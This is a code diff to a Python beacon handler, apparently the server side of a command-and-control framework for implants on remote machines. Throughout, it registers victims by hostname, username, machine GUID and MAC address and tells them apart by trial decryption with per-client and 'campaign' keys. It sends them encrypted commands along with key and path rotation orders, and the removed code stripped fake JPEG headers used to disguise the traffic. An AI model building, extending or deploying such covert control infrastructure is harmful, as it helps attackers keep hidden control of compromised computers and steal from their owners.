@@ -2,6 +2,8 @@ import logging
 import json
 import base64
 import re
+import uuid
+import hashlib
 
 logger = logging.getLogger(__name__)
 
@@ -20,7 +22,7 @@ class BeaconHandler(BaseHandler):
         self.log_message(f"Beacon received from {self.client_address[0]}")
         
         try:
-            # Read content data - now client info is in the request body
+            # Read content data
             content_length = int(self.headers.get('Content-Length', 0))
             if content_length == 0:
                 self.send_error_response(400, "Missing content")
@@ -31,113 +33,141 @@ class BeaconHandler(BaseHandler):
             # Parse the JSON body
             try:
                 body_data = json.loads(request_body)
-                client_id = body_data.get('client_id')
-                system_info_raw = body_data.get('data')
-                rotation_id = body_data.get('rotation_id')
+                is_first_contact = body_data.get('first_contact', False)
+                encrypted_data = body_data.get('data')
                 
-                # Process JPEG headers if present in either binary or text form
-                if system_info_raw and isinstance(system_info_raw, str):
-                    try:
-                        # Try to decode base64 to check for binary JPEG header
-                        try:
-                            decoded_data = base64.b64decode(system_info_raw)
-                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
-                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
-                                # Remove the JPEG header (first 3 bytes)
-                                decoded_data = decoded_data[3:]
-                                self.log_message(f"Removed binary JPEG header from data")
-                                
-                                # Re-encode to base64 for decryption
-                                system_info_raw = base64.b64encode(decoded_data).decode('utf-8')
-                        except Exception as e:
-                            # If it's not valid base64 or has no header, continue with text checks
-                            self.log_message(f"Not a valid base64 with binary JPEG header: {str(e)}")
-                            
-                        # Text-based header checks as fallback
-                        if system_info_raw.startswith("0xFFD8FF"):
-                            system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
-                            self.log_message(f"Removed text JPEG header '0xFFD8FF' from data")
-                        elif system_info_raw.startswith("FFD8FF"):
-                            system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
-                            self.log_message(f"Removed text JPEG header 'FFD8FF' from data")
-                    except Exception as e:
-                        self.log_message(f"Error processing potential JPEG headers: {str(e)}")
+                if not encrypted_data:
+                    self.send_error_response(400, "Missing data field")
+                    return
+                
+                # Process first contact differently
+                if is_first_contact:
+                    # For first contact, generate a new client ID and handle system info directly
+                    client_id = self._generate_client_id()
+                    system_info_raw = encrypted_data  # Should be unencrypted JSON for first contact
                     
-                # Log the received client ID to verify
-                self.log_message(f"Client ID from request body: {client_id}")
+                    # Log that we're handling first contact
+                    self.log_message(f"Handling first contact - generated client ID: {client_id}")
+                    
+                    try:
+                        # Parse the system info
+                        system_info = json.loads(system_info_raw) if isinstance(system_info_raw, str) else system_info_raw
+                    except json.JSONDecodeError:
+                        self.log_message("Invalid system info format in first contact")
+                        self.send_error_response(400, "Invalid system info format")
+                        return
+                    
+                    # Register the new client
+                    client_id = self.client_manager.add_client(
+                        ip=self.client_address[0],
+                        hostname=system_info.get('Hostname', 'Unknown'),
+                        username=system_info.get('Username', 'Unknown'),
+                        machine_guid=system_info.get('MachineGuid', 'Unknown'),
+                        os_version=system_info.get('OsVersion', 'Unknown'),
+                        mac_address=system_info.get('MacAddress', 'Unknown'),
+                        system_info=system_info,
+                        client_id=client_id
+                    )
+                    
+                    # Mark as new identification and first contact
+                    newly_identified = True
+                    first_contact = True
+                    
+                else:
+                    # For established clients, identify by encryption key
+                    client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
+                    
+                    if client_id is None and decrypted_data is None:
+                        # No key could decrypt the data - fail
+                        self.send_error_response(400, "Authentication failed - could not decrypt data")
+                        return
+                    
+                    # If we have data but no client ID, we're in an odd state
+                    if client_id is None and decrypted_data is not None:
+                        # This is likely a client with the campaign key - treat as first contact
+                        client_id = self._generate_client_id()
+                        self.log_message(f"Client using campaign key - treating as first contact with ID: {client_id}")
+                        newly_identified = True
+                        first_contact = True
+                    else:
+                        # Normal established client
+                        newly_identified = False
+                        first_contact = False
+                    
+                    # Parse the system info if we have it
+                    try:
+                        system_info = json.loads(decrypted_data) if isinstance(decrypted_data, str) else decrypted_data
+                    except (json.JSONDecodeError, TypeError):
+                        self.log_message(f"Could not parse system info for client {client_id}")
+                        system_info = {"Hostname": "Unknown", "IP": self.client_address[0]}
+                    
+                    # Update client information
+                    if not first_contact:
+                        self.client_manager.add_client(
+                            ip=self.client_address[0],
+                            hostname=system_info.get('Hostname', 'Unknown'),
+                            username=system_info.get('Username', 'Unknown'),
+                            machine_guid=system_info.get('MachineGuid', 'Unknown'),
+                            os_version=system_info.get('OsVersion', 'Unknown'),
+                            mac_address=system_info.get('MacAddress', 'Unknown'),
+                            system_info=system_info,
+                            client_id=client_id
+                        )
+                
+                # Log the beacon
+                self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
+                
+                # Verify client if system info is available and not first contact
+                needs_key_rotation = False
+                if system_info and not first_contact:
+                    _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
+                
+                # Always issue a key for first contact
+                if first_contact:
+                    needs_key_rotation = True
+                
+                # Organize commands for the client
+                commands, has_key_operation = self.client_helper.organize_commands(
+                    client_id, 
+                    include_key_rotation=needs_key_rotation,
+                    first_contact=first_contact
+                )
+                
+                # Add path rotation command if needed for established clients
+                if include_rotation_info and not first_contact:
+                    path_rotation_command = self.path_router.create_path_rotation_command()
+                    commands.append(path_rotation_command)
+                    self.log_message(f"Sending path rotation info to client {client_id}")
+                
+                # Log commands being sent
+                for command in commands:
+                    cmd_type = command['command_type']
+                    args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
+                    self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
+                
+                # Send response to client
+                self._send_beacon_response(client_id, commands, has_key_operation, first_contact, include_rotation_info)
+                
+                # Clear key rotation commands after delivery
+                if has_key_operation and not first_contact:
+                    self.client_helper.clear_commands_after_rotation(client_id)
+                    
             except json.JSONDecodeError:
                 self.send_error_response(400, "Invalid JSON format")
                 return
-            
-            # Identify the client using the data from request body
-            client_id, system_info, newly_identified, first_contact = self.client_helper.identify_client_from_body(
-                self.client_address[0], 
-                client_id,
-                system_info_raw
-            )
-            
-            # Log the beacon
-            self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
-            
-            # Increment communication counter and check for auto rotation
-            # Skip for first contact as we need the client to be established first
-            needs_auto_rotation = False
-            if not first_contact:
-                # Increment the communication counter and check if rotation is needed
-                needs_auto_rotation = self.client_manager.increment_communication_counter(client_id)
-            
-            # Verify client if system info is available and not first contact
-            needs_key_rotation = False
-            if system_info and not first_contact:
-                _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
-            
-            # Organize commands for the client
-            commands, has_key_operation = self.client_helper.organize_commands(
-                client_id, 
-                include_key_rotation=needs_key_rotation,
-                first_contact=first_contact
-            )
-            
-            # If auto rotation is needed, add client ID rotation command
-            if needs_auto_rotation:
-                # Generate a new client ID and prepare rotation command
-                rotation_command = self.client_helper.prepare_client_id_rotation(client_id)
-                # Add it after any key rotation but before other commands
-                if has_key_operation:
-                    commands.insert(1, rotation_command)  # After key rotation
-                else:
-                    commands.insert(0, rotation_command)  # At the beginning
-                self.log_message(f"Added automatic client ID rotation command for {client_id}")
-            
-            # Add path rotation command if needed for established clients
-            if include_rotation_info and not first_contact:
-                path_rotation_command = self.path_router.create_path_rotation_command()
-                commands.append(path_rotation_command)
-                self.log_message(f"Sending path rotation info to client {client_id}")
-            
-            # Log commands being sent
-            for command in commands:
-                cmd_type = command['command_type']
-                args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
-                self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
-            
-            # Get the current client ID for responding
-            current_client_id = self.client_manager.get_current_client_id(client_id)
-            if current_client_id != client_id:
-                self.log_message(f"Using current client ID {current_client_id} for response to {client_id}")
-            
-            # Send response to client
-            self._send_beacon_response(client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info)
-            
-            # Clear key rotation commands after delivery
-            if has_key_operation and not first_contact:
-                self.client_helper.clear_commands_after_rotation(client_id)
                 
         except Exception as e:
             logger.error(f"Error handling beacon: {str(e)}")
             self.send_error_response(500, "Internal server error")
     
-    def _send_beacon_response(self, client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info):
+    def _generate_client_id(self):
+        """Generate a unique client ID for new clients"""
+        # Create a random UUID and take the first 8 characters
+        random_id = str(uuid.uuid4())[:8]
+        # Return a simple string ID
+        return f"client_{random_id}"
+    
+    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
         """Send the response to the client beacon"""
         # For first contact or key operations, we need to send more detailed information
         if first_contact or has_key_operation or include_rotation_info or commands:
@@ -172,7 +202,7 @@ class BeaconHandler(BaseHandler):
                 # Convert commands to JSON string for encryption
                 commands_json = json.dumps(commands)
                 
-                # Encrypt the commands - use the original client ID for encryption key
+                # Encrypt the commands
                 encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
                 
                 # Replace commands with encrypted version
